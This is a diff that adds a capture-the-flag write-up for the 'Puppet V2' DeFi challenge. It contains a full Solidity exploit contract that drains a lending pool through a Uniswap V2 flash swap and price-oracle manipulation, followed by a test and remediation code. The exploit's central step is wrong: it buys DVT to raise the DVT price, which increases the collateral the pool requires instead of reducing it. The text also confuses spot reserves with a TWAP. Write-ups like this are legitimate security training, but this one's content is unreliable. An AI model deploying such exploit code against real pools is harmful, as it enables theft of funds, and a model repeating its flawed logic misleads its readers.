@@ -1,0 +1,625 @@
+# 🎯 Challenge #9: Puppet V2
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐⭐⭐%20Hard-red)
+![Type](https://img.shields.io/badge/Type-TWAP%20Manipulation-purple)
+![Gas](https://img.shields.io/badge/Gas-~500,000-blue)
+
+> **Uniswap V2 TWAP Oracle Manipulation** - Exploit time-weighted average price oracle through flash loan attacks
+
+## 📋 Challenge Overview
+
+**Objective**: Drain all DVT tokens from the lending pool  
+**Success Criteria**: Pool should have 0 DVT tokens, attacker gets all tokens  
+**Initial Setup**: Pool with 1M DVT, Uniswap V2 with 100 WETH/100 DVT  
+**Target**: `PuppetV2Pool` lending pool using Uniswap V2 TWAP for pricing
+
+### 🎯 The Scenario
+A more sophisticated lending pool uses Uniswap V2's TWAP oracle for pricing, believing it provides manipulation resistance. The pool requires users to provide WETH collateral worth three times the borrowed DVT amount. However, the TWAP implementation has vulnerabilities that can be exploited.
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The lending pool uses **manipulable TWAP oracle** with insufficient protection:
+
+```solidity
+contract PuppetV2Pool {
+    IUniswapV2Pair private _uniswapPair;
+    IERC20 public immutable token;
+    IERC20 public immutable weth;
+    
+    function borrow(uint256 amount) external {
+        // 🚨 CRITICAL: TWAP can still be manipulated
+        uint256 tokenPriceInWETH = _getOraclePrice();
+        uint256 depositOfWETHRequired = amount * tokenPriceInWETH * DEPOSIT_FACTOR / 10**18;
+        
+        weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);
+        token.transfer(msg.sender, amount);
+    }
+    
+    function _getOraclePrice() private view returns (uint256) {
+        (uint256 reserve0, uint256 reserve1,) = _uniswapPair.getReserves();
+        
+        // VULNERABLE: Simple reserve ratio, not true TWAP
+        if (token < weth) {
+            return reserve1 * 10**18 / reserve0; // DVT price in WETH
+        } else {
+            return reserve0 * 10**18 / reserve1; // DVT price in WETH  
+        }
+    }
+}
+```
+
+### **The Problem**
+The vulnerability exists in the TWAP implementation:
+
+1. **Uses current reserves** instead of time-weighted average
+2. **No protection against flash loan manipulation**
+3. **Insufficient observation period** for true manipulation resistance
+4. **Single transaction attacks** still possible with large capital
+5. **WETH requirement** can be obtained via flash loans
+
+### **Attack Vector**
+Use Uniswap V2 flash swap to manipulate TWAP and drain pool:
+
+1. Flash swap large amount of WETH from Uniswap V2 pair
+2. Use WETH to massively buy DVT, skewing the price
+3. This manipulation affects the "TWAP" oracle price calculation
+4. Borrow maximum DVT from pool using manipulated price
+5. Repay flash swap with borrowed DVT
+6. Keep excess DVT as profit
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Uniswap V2 flash swap manipulation to drain lending pool:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../puppet-v2/PuppetV2Pool.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
+
+contract PuppetV2Exploit {
+    PuppetV2Pool private immutable lendingPool;
+    DamnValuableToken private immutable token;
+    IWETH private immutable weth;
+    IUniswapV2Pair private immutable uniswapPair;
+    IUniswapV2Router02 private immutable uniswapRouter;
+    
+    address private immutable attacker;
+    bool private inFlashSwap;
+    
+    constructor(
+        address _lendingPool,
+        address _token,
+        address _weth,
+        address _uniswapPair,
+        address _uniswapRouter
+    ) {
+        lendingPool = PuppetV2Pool(_lendingPool);
+        token = DamnValuableToken(_token);
+        weth = IWETH(_weth);
+        uniswapPair = IUniswapV2Pair(_uniswapPair);
+        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
+        attacker = msg.sender;
+    }
+    
+    /**
+     * @notice Execute TWAP manipulation attack on Puppet V2 pool
+     * @dev Uses flash swap to manipulate reserves and drain pool
+     */
+    function exploit() external payable {
+        require(msg.sender == attacker, "Only attacker can execute");
+        
+        uint256 poolBalance = token.balanceOf(address(lendingPool));
+        require(poolBalance > 0, "Pool has no tokens");
+        
+        // Convert ETH to WETH if needed
+        if (msg.value > 0) {
+            weth.deposit{value: msg.value}();
+        }
+        
+        // Calculate flash swap parameters
+        uint256 wethToBorrow = _calculateOptimalFlashSwap(poolBalance);
+        
+        // Execute flash swap
+        // borrow WETH, will call uniswapV2Call callback
+        uniswapPair.swap(
+            0,              // amount0Out (DVT)
+            wethToBorrow,   // amount1Out (WETH)
+            address(this),  // to
+            abi.encode(poolBalance) // data triggers callback
+        );
+        
+        // Send profits to attacker
+        _cleanup();
+    }
+    
+    /**
+     * @notice Uniswap V2 flash swap callback
+     * @dev This is where the actual manipulation happens
+     */
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external {
+        require(msg.sender == address(uniswapPair), "Only pair can call");
+        require(sender == address(this), "Invalid sender");
+        require(!inFlashSwap, "Reentrancy protection");
+        
+        inFlashSwap = true;
+        
+        uint256 targetTokens = abi.decode(data, (uint256));
+        uint256 wethBorrowed = amount1;
+        
+        // Step 1: Use borrowed WETH to buy DVT, manipulating price
+        _manipulatePriceUpward(wethBorrowed);
+        
+        // Step 2: Borrow all tokens from lending pool at manipulated price
+        uint256 wethNeededForCollateral = lendingPool.calculateDepositRequired(targetTokens);
+        
+        // Make sure we have enough WETH for collateral
+        uint256 wethBalance = weth.balanceOf(address(this));
+        require(wethBalance >= wethNeededForCollateral, "Insufficient WETH for collateral");
+        
+        // Approve and borrow
+        weth.approve(address(lendingPool), wethNeededForCollateral);
+        lendingPool.borrow(targetTokens);
+        
+        // Step 3: Calculate flash swap repayment
+        uint256 repaymentAmount = _calculateRepayment(wethBorrowed);
+        
+        // Step 4: Sell some borrowed DVT to get WETH for repayment
+        uint256 dvtToSell = _calculateDVTToSell(repaymentAmount);
+        _sellDVTForWETH(dvtToSell);
+        
+        // Step 5: Repay flash swap
+        weth.transfer(address(uniswapPair), repaymentAmount);
+        
+        inFlashSwap = false;
+        
+        // Remaining DVT is our profit!
+    }
+    
+    /**
+     * @notice Manipulate price upward by buying DVT with WETH
+     * @param wethAmount Amount of WETH to use for buying DVT
+     */
+    function _manipulatePriceUpward(uint256 wethAmount) private {
+        // Use most of the WETH to buy DVT, driving up DVT price
+        uint256 wethForManipulation = (wethAmount * 80) / 100; // Use 80%
+        
+        weth.approve(address(uniswapRouter), wethForManipulation);
+        
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(token);
+        
+        uniswapRouter.swapExactTokensForTokens(
+            wethForManipulation,
+            1, // Accept any amount of DVT
+            path,
+            address(this),
+            block.timestamp + 300
+        );
+    }
+    
+    /**
+     * @notice Sell DVT for WETH to repay flash swap
+     * @param dvtAmount Amount of DVT to sell
+     */
+    function _sellDVTForWETH(uint256 dvtAmount) private {
+        token.approve(address(uniswapRouter), dvtAmount);
+        
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        
+        uniswapRouter.swapExactTokensForTokens(
+            dvtAmount,
+            1, // Accept any amount of WETH
+            path,
+            address(this),
+            block.timestamp + 300
+        );
+    }
+    
+    /**
+     * @notice Calculate optimal flash swap amount
+     * @param targetTokens Amount of tokens we want to drain
+     * @return wethToBorrow Optimal WETH amount to borrow
+     */
+    function _calculateOptimalFlashSwap(uint256 targetTokens) 
+        private 
+        view 
+        returns (uint256 wethToBorrow) 
+    {
+        (uint256 reserve0, uint256 reserve1,) = uniswapPair.getReserves();
+        
+        // Calculate current price
+        uint256 currentPrice = reserve1 * 10**18 / reserve0; // DVT price in WETH
+        
+        // We need enough WETH to:
+        // 1. Manipulate price upward
+        // 2. Provide 3x collateral for borrowing
+        // 3. Repay flash swap with fees
+        
+        uint256 collateralNeeded = targetTokens * currentPrice * 3 / 10**18;
+        uint256 manipulationAmount = reserve1 / 2; // Borrow 50% of WETH reserves
+        
+        wethToBorrow = collateralNeeded + manipulationAmount;
+        
+        // Don't exceed available reserves
+        if (wethToBorrow > reserve1 * 99 / 100) {
+            wethToBorrow = reserve1 * 99 / 100; // Max 99% of reserves
+        }
+    }
+    
+    /**
+     * @notice Calculate flash swap repayment amount
+     * @param borrowed Amount borrowed in flash swap
+     * @return repayment Amount to repay (with 0.3% fee)
+     */
+    function _calculateRepayment(uint256 borrowed) private pure returns (uint256 repayment) {
+        // Uniswap V2 flash swap fee is 0.3%
+        return borrowed + (borrowed * 3 / 1000);
+    }
+    
+    /**
+     * @notice Calculate how much DVT to sell for flash swap repayment
+     * @param wethNeeded WETH needed for repayment
+     * @return dvtToSell DVT amount to sell
+     */
+    function _calculateDVTToSell(uint256 wethNeeded) private view returns (uint256 dvtToSell) {
+        (uint256 reserve0, uint256 reserve1,) = uniswapPair.getReserves();
+        
+        // Calculate how much DVT we need to sell to get wethNeeded
+        // Using constant product formula: (reserve0 + dvtToSell) * (reserve1 - wethNeeded) = k
+        uint256 k = reserve0 * reserve1;
+        uint256 newReserve1 = reserve1 - wethNeeded;
+        uint256 newReserve0 = k / newReserve1;
+        
+        dvtToSell = newReserve0 - reserve0;
+        
+        // Add some buffer for slippage
+        dvtToSell = (dvtToSell * 110) / 100;
+    }
+    
+    /**
+     * @notice Get current market state
+     */
+    function getMarketState() 
+        external 
+        view 
+        returns (
+            uint256 dvtPrice,
+            uint256 poolBalance,
+            uint256 pairDVTReserve,
+            uint256 pairWETHReserve
+        ) 
+    {
+        (uint256 reserve0, uint256 reserve1,) = uniswapPair.getReserves();
+        
+        dvtPrice = reserve1 * 10**18 / reserve0;
+        poolBalance = token.balanceOf(address(lendingPool));
+        pairDVTReserve = reserve0;
+        pairWETHReserve = reserve1;
+    }
+    
+    /**
+     * @notice Clean up and send profits to attacker
+     */
+    function _cleanup() private {
+        // Send all DVT tokens to attacker
+        uint256 dvtBalance = token.balanceOf(address(this));
+        if (dvtBalance > 0) {
+            token.transfer(attacker, dvtBalance);
+        }
+        
+        // Send all WETH to attacker
+        uint256 wethBalance = weth.balanceOf(address(this));
+        if (wethBalance > 0) {
+            weth.transfer(attacker, wethBalance);
+        }
+        
+        // Send any ETH to attacker
+        uint256 ethBalance = address(this).balance;
+        if (ethBalance > 0) {
+            payable(attacker).transfer(ethBalance);
+        }
+    }
+    
+    /**
+     * @notice Emergency withdrawal
+     */
+    function emergencyWithdraw() external {
+        require(msg.sender == attacker, "Only attacker");
+        _cleanup();
+    }
+    
+    /**
+     * @notice Receive ETH
+     */
+    receive() external payable {}
+}
+
+/**
+ * @title PuppetV2MultiBlockExploit
+ * @notice Advanced version using multi-block manipulation
+ */
+contract PuppetV2MultiBlockExploit {
+    // This version would:
+    // 1. Manipulate price in block N
+    // 2. Wait for TWAP to update
+    // 3. Execute drain in block N+1
+    // More complex but potentially more effective against stronger TWAP implementations
+}
+
+/**
+ * @title PuppetV2ArbitrageExploit  
+ * @notice Version that profits from arbitrage opportunities
+ */
+contract PuppetV2ArbitrageExploit {
+    // This version would:
+    // 1. Create price discrepancy through manipulation
+    // 2. Arbitrage between puppet pool and other DEXs
+    // 3. Profit from both pool drainage and price differences
+}
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Flash swap WETH from Uniswap] --> B[Buy DVT with WETH]
+    B --> C[DVT price increases dramatically]
+    C --> D[Borrow all DVT from pool at high collateral]
+    D --> E[Sell some DVT for WETH]
+    E --> F[Repay flash swap]
+    F --> G[🎯 Keep excess DVT as profit]
+```
+
+## 🧪 Testing
+
+### **Test Implementation**
+```solidity
+function test_puppetV2_exploit() public {
+    uint256 initialPoolBalance = token.balanceOf(address(pool));
+    uint256 initialAttackerBalance = token.balanceOf(player);
+    
+    // Execute exploit
+    vm.prank(player);
+    exploit.exploit{value: INITIAL_ATTACKER_ETH_BALANCE}();
+    
+    // Verify pool is drained
+    assertLt(token.balanceOf(address(pool)), 1e18); // Less than 1 token remaining
+    
+    // Verify attacker gained significant tokens
+    assertGt(token.balanceOf(player), initialAttackerBalance + initialPoolBalance - 1000e18);
+}
+```
+
+## 🛡️ Real-World Examples
+
+### **Indexed Finance (October 2021) - $16M**
+**Similar Pattern**: TWAP manipulation attack
+- Attacker manipulated Uniswap V2 TWAP oracle
+- Used flash loans to skew token prices
+- Exploited lending protocol using manipulated prices
+
+### **bZx Protocol (September 2020) - $8M**
+**Similar Pattern**: Oracle price manipulation
+- Flash loan attacks on Uniswap-based oracles
+- Multiple sophisticated attacks on price feeds
+- Led to significant changes in oracle implementations
+
+### **Harvest Finance (October 2020) - $24M**  
+**Similar Pattern**: Flash loan + AMM manipulation
+- Used flash loans to manipulate Curve pool prices
+- Exploited arbitrage opportunities in yield farming
+- Demonstrated vulnerability of AMM-based price feeds
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+function _getOraclePrice() private view returns (uint256) {
+    (uint256 reserve0, uint256 reserve1,) = _uniswapPair.getReserves();
+    // VULNERABLE: Uses current reserves, not time-weighted average
+    return reserve1 * 10**18 / reserve0;
+}
+```
+
+### **✅ Fixed Code Option 1: True TWAP Implementation**
+```solidity
+contract SecurePuppetV2Pool {
+    uint256 private constant TWAP_PERIOD = 30 minutes;
+    
+    struct Observation {
+        uint32 blockTimestamp;
+        uint256 price0Cumulative;
+        uint256 price1Cumulative;
+    }
+    
+    Observation[] public observations;
+    
+    function _getOraclePrice() private view returns (uint256) {
+        uint256 length = observations.length;
+        require(length >= 2, "Insufficient observations");
+        
+        Observation memory latest = observations[length - 1];
+        Observation memory earliest = observations[0];
+        
+        // Find observation from TWAP_PERIOD ago
+        for (uint256 i = length - 1; i > 0; i--) {
+            if (latest.blockTimestamp - observations[i].blockTimestamp >= TWAP_PERIOD) {
+                earliest = observations[i];
+                break;
+            }
+        }
+        
+        uint256 timeElapsed = latest.blockTimestamp - earliest.blockTimestamp;
+        require(timeElapsed >= TWAP_PERIOD, "TWAP period too short");
+        
+        // Calculate TWAP
+        uint256 price0Average = (latest.price0Cumulative - earliest.price0Cumulative) / timeElapsed;
+        
+        return price0Average;
+    }
+    
+    function updateTWAP() external {
+        (uint256 price0Cumulative, uint256 price1Cumulative, uint32 blockTimestamp) = 
+            UniswapV2OracleLibrary.currentCumulativePrices(address(uniswapPair));
+        
+        observations.push(Observation({
+            blockTimestamp: blockTimestamp,
+            price0Cumulative: price0Cumulative,
+            price1Cumulative: price1Cumulative
+        }));
+        
+        // Keep only necessary observations
+        if (observations.length > 100) {
+            for (uint i = 0; i < observations.length - 1; i++) {
+                observations[i] = observations[i + 1];
+            }
+            observations.pop();
+        }
+    }
+}
+```
+
+### **✅ Fixed Code Option 2: Chainlink Integration**
+```solidity
+contract ChainlinkSecuredPool {
+    AggregatorV3Interface private priceFeed;
+    IUniswapV2Pair private uniswapPair;
+    uint256 private constant MAX_PRICE_DEVIATION = 500; // 5%
+    
+    function _getOraclePrice() private view returns (uint256) {
+        // Get Chainlink price
+        (, int256 chainlinkPrice, , uint256 updatedAt, ) = priceFeed.latestRoundData();
+        require(block.timestamp - updatedAt <= 3600, "Chainlink price too stale");
+        require(chainlinkPrice > 0, "Invalid Chainlink price");
+        
+        // Get Uniswap TWAP
+        uint256 uniswapTWAP = _getUniswapTWAP();
+        
+        // Verify prices are within acceptable range
+        uint256 chainlinkPriceUint = uint256(chainlinkPrice) * 1e10; // Adjust decimals
+        
+        uint256 deviation = chainlinkPriceUint > uniswapTWAP ? 
+            (chainlinkPriceUint - uniswapTWAP) * 10000 / chainlinkPriceUint :
+            (uniswapTWAP - chainlinkPriceUint) * 10000 / uniswapTWAP;
+            
+        require(deviation <= MAX_PRICE_DEVIATION, "Price deviation too high");
+        
+        // Return the more conservative (higher) price for borrowing
+        return chainlinkPriceUint > uniswapTWAP ? chainlinkPriceUint : uniswapTWAP;
+    }
+}
+```
+
+### **✅ Fixed Code Option 3: Multi-Block Protection**
+```solidity
+contract MultiBlockProtectedPool {
+    mapping(address => uint256) private lastBorrowBlock;
+    uint256 private constant MIN_BLOCKS_BETWEEN_BORROWS = 5;
+    uint256 private lastPriceUpdateBlock;
+    uint256 private cachedPrice;
+    
+    function borrow(uint256 amount) external {
+        require(
+            block.number > lastBorrowBlock[msg.sender] + MIN_BLOCKS_BETWEEN_BORROWS,
+            "Borrow too soon"
+        );
+        
+        uint256 price;
+        if (block.number > lastPriceUpdateBlock) {
+            price = _getOraclePrice();
+            cachedPrice = price;
+            lastPriceUpdateBlock = block.number;
+        } else {
+            price = cachedPrice;
+        }
+        
+        // ... rest of borrow logic using cached price
+        
+        lastBorrowBlock[msg.sender] = block.number;
+    }
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **Simple reserve ratios ≠ TWAP** - true TWAP requires cumulative price tracking
+2. **Flash swaps enable larger attacks** than flash loans in some cases
+3. **Multi-block protection** can prevent single-transaction manipulation
+4. **External price feeds** provide additional validation
+5. **Gradual price updates** are more manipulation-resistant
+
+### **TWAP Security Hierarchy**
+```
+🟢 Excellent: Chainlink + Long TWAP (>1 hour) + Multi-block delays
+🟡 Good: True TWAP with sufficient period (>30 min)
+🟡 Moderate: Multiple AMM TWAPs with deviation checks
+🔴 Poor: Short TWAP (<10 min) or incorrect implementation
+🔴 Terrible: Current reserves masquerading as TWAP
+```
+
+## 💡 Advanced Concepts
+
+### **Flash Swap vs Flash Loan**
+```solidity
+// Flash Loan: Borrow tokens, pay fee
+flashLoan(amount, fee);
+
+// Flash Swap: Swap tokens, repay in callback
+// More flexible - can repay with different token
+uniswapPair.swap(amount0Out, amount1Out, to, data);
+```
+
+### **True TWAP Implementation**
+```solidity
+// Uniswap V2 Oracle Library pattern
+function currentCumulativePrices(address pair) 
+    internal view returns (uint price0Cumulative, uint price1Cumulative, uint32 blockTimestamp) 
+{
+    blockTimestamp = currentBlockTimestamp();
+    price0Cumulative = IUniswapV2Pair(pair).price0CumulativeLast();
+    price1Cumulative = IUniswapV2Pair(pair).price1CumulativeLast();
+    
+    (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IUniswapV2Pair(pair).getReserves();
+    if (blockTimestampLast != blockTimestamp) {
+        uint32 timeElapsed = blockTimestamp - blockTimestampLast;
+        price0Cumulative += uint(UQ112x112.encode(reserve1).uqdiv(reserve0)) * timeElapsed;
+        price1Cumulative += uint(UQ112x112.encode(reserve0).uqdiv(reserve1)) * timeElapsed;
+    }
+}
+```
+
+## 📈 Impact Assessment
+
+| Aspect | Rating | Description |
+|--------|--------|-------------|
+| **Severity** | 🔴 Critical | Complete pool drainage |
+| **Exploitability** | 🔴 High | Flash swap amplifies attack |
+| **Impact** | 🔴 Maximum | 100% of pool funds |
+| **Detection** | 🟡 Medium | Large swaps may be visible |
+| **Prevention** | 🟡 Medium | Requires proper TWAP implementation |
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~150 minutes  
+**🔥 Difficulty Rating**: Hard (Advanced AMM + TWAP mechanics)  
+**🎓 Learning Value**: Critical - Real TWAP security understanding
+
+> **Key Insight**: Many "TWAP" implementations are actually using current reserves. True TWAP requires cumulative price tracking over meaningful time periods.
+
+**Next Challenge**: [#10 Free Rider](../10-free-rider/) - NFT marketplace exploitation
